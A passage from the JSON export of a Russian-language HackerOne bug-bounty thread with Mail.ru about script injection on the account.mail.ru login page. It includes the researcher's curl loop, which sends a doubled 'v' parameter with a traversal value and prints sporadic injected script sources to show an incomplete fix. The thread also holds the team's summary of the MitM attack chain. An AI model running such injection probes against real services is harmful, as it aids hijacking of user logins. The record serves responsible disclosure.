пункт","automated_response":false,"created_at":"2017-11-18T16:35:52.636Z","updated_at":"2017-11-18T16:35:52.636Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2167754,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"UPD2: Оказывается в хроме тоже работает, по крайней мере под линуском. Как оказалось ссылки на файлы живут не так уж и долго, поэтому на сервер положу скрипт, который будет каждый час генерить новые. Если вдруг POC перестанет работать - напишите в комментах, плз.","automated_response":false,"created_at":"2017-11-18T18:51:45.621Z","updated_at":"2017-11-18T18:52:11.508Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2167824,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\n\nПрисланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.","automated_response":false,"created_at":"2017-11-18T20:31:29.108Z","updated_at":"2017-11-18T20:31:29.108Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2167963,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет\nВ качестве быстрофикса вкрутили валидацию параметра 'v'\nПоведение сервака 178.237.20.77 будем также исправлять, но уже не сегодня","automated_response":false,"created_at":"2017-11-18T22:44:56.576Z","updated_at":"2017-11-18T22:44:56.576Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2168033,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ого, оперативно, спасибо! Валидацию потестил, не знаю как у mail.ru синкается код между серверами, но сейчас фикс выглядит неполным.\n\nЗапускал из разных стран, иногда таки отстреливает без валидации:\n\n```\nubuntu@ip-172-31-36-215:~/www/php/pocs/tmp$ for i in `seq 1 50`; do echo \"Try $i - `curl -is \"https://account.mail.ru/login?v=1.3.14633asd\u0026v=1.2.544/lalala/../../../../?$i\" | grep -oh '\u003cscript\\ssrc=.*authGate.js'`\"; done;                                                                                                                                                                                                         \nTry 1 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 2 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 3 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 4 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 5 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 6 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 7 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 8 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 9 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 10 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 11 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 12 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 13 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 14 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 15 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 16 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?16/authGate.js\nTry 17 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 18 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 19 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 20 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 21 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?21/authGate.js\nTry 22 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 23 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 24 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 25 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 26 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 27 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 28 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 29 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 30 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 31 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 32 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 33 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 34 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 35 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 36 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 37 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 38 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 39 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 40 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 41 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 42 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 43 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 44 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 45 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 46 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 47 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 48 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 49 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 50 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\n```\n\n```\nmihailob@kali:~$ for i in `seq 1 50`; do echo \"Try $i - `curl -is \"https://account.mail.ru/login?v=1.3.14633asd\u0026v=1.2.544/lalala/../../../../?$i\" | grep -oh '\u003cscript\\ssrc=.*authGate.js'`\"; done;\nTry 1 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 2 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 3 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 4 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 5 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 6 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 7 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 8 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 9 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 10 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?10/authGate.js\nTry 11 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 12 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 13 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 14 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 15 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 16 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 17 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 18 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 19 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 20 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 21 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 22 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 23 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 24 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 25 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 26 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 27 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 28 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 29 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 30 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 31 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 32 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 33 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 34 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 35 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?35/authGate.js\nTry 36 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?36/authGate.js\nTry 37 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 38 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 39 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 40 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 41 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 42 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 43 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 44 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 45 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 46 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 47 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 48 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 49 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 50 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\n```","automated_response":false,"created_at":"2017-11-19T00:02:09.911Z","updated_at":"2017-11-19T00:02:09.911Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2168366,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Только сегодня заметил что вывод dig и host в дескрипшне репорта неверный (там выводится 94.100.180.102) . Видимо я скопировал вывод до рестарта dnsmasq'а. Там в выводе на самом деле 178.237.20.77. Надеюсь никого не ввёл в заблуждение.","automated_response":false,"created_at":"2017-11-19T10:44:19.892Z","updated_at":"2017-11-19T10:44:19.892Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2168590,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет.\nПро \"неполный фикс\" сообщил разразработчикам. Спасибо за находку.\nПо поводу \"dig и host в дескрипшне репорта\" не переживай, мы поняли что ты имел ввиду, иначе бы попросили уточнений. ","automated_response":false,"created_at":"2017-11-19T14:50:14.956Z","updated_at":"2017-11-19T14:50:14.956Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2172575,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Привет, бага закрыта.\nПожалуйста, подтвердите, что проблема больше не воспроизводится. \n","automated_response":false,"created_at":"2017-11-21T11:00:12.636Z","updated_at":"2017-11-21T11:00:12.636Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"obmi","url":"/obmi"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2172599,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет, да, подтверждаю, не воспроизводится","automated_response":false,"created_at":"2017-11-21T11:20:08.183Z","updated_at":"2017-11-21T11:20:08.183Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2176095,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет, не хочу показаться наглым, но попадает ли данный отчет под баунти?)","automated_response":false,"created_at":"2017-11-22T07:47:56.755Z","updated_at":"2017-11-22T07:47:56.755Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2176191,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Да, account.mail.ru попадает в скоп программы, решение по размерам выплаты обычно принимается в течение двух недель после репорта.","automated_response":false,"created_at":"2017-11-22T09:09:17.890Z","updated_at":"2017-11-22T09:09:17.890Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2176749,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Привет, вознаграждение за найденную уязвимость начислено на твой аккаунт. На странице https://hackerone.com/settings/bounties можно выбрать желаемый метод выплаты. \n\nСпасибо и ждем от тебя новых багрепортов!\n\nP.S. работа по устранению уязвимости пока продолжается.","automated_response":false,"created_at":"2017-11-22T15:14:43.850Z","updated_at":"2017-11-22T15:14:43.850Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"mailru","collaborator":{"username":"obmi","url":"/obmi"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2176894,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Спасибо! Немного не понял про работу, которая продолжается. Уже вроде зарезолвили и пофиксили :)","automated_response":false,"created_at":"2017-11-22T16:01:24.779Z","updated_at":"2017-11-22T16:01:24.779Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2176908,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Упс... Небольшая ошибочка. Всё зафикшено. Всё хорошо )","automated_response":false,"created_at":"2017-11-22T16:07:45.720Z","updated_at":"2017-11-22T16:07:45.720Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2247011,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2017-12-26T16:03:52.068Z","updated_at":"2018-02-28T13:11:30.224Z","additional_data":{"added_weaknesses":[{"id":30,"name":"Man-in-the-Middle"}],"removed_weaknesses":[{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"}]},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2248398,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-12-27T14:11:31.894Z","updated_at":"2017-12-27T14:11:31.894Z","first_to_agree":true,"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2320809,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-01-26T14:11:48.772Z","updated_at":"2018-01-26T14:11:48.772Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":6165,"category":"team","content":"Due to combination of\n1. Wildcard certificate usage\n2. Unvalidated Host: name in HTTP(s) request\n3. Reusing domain name for hosting of user-controlled files\n4. Unfiltered parameter reflection\n\nIt was possible for attacker who can perform active MitM access between client and server to execute javascript in the context of  https://account.mail.ru/login page.\n","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":4836,"username":"3apa3a","name":"Vladimir Dubrovin","bio":"En la agostada senda he visto al buen lagarto (gota de cocodrilo) meditando. ","cleared":false,"website":"https://3proxy.org/","location":"Nizhny Novgorod, Russia","created_at":"2014-04-10T22:08:47.745Z","url":"https://hackerone.com/3apa3a","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"company","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}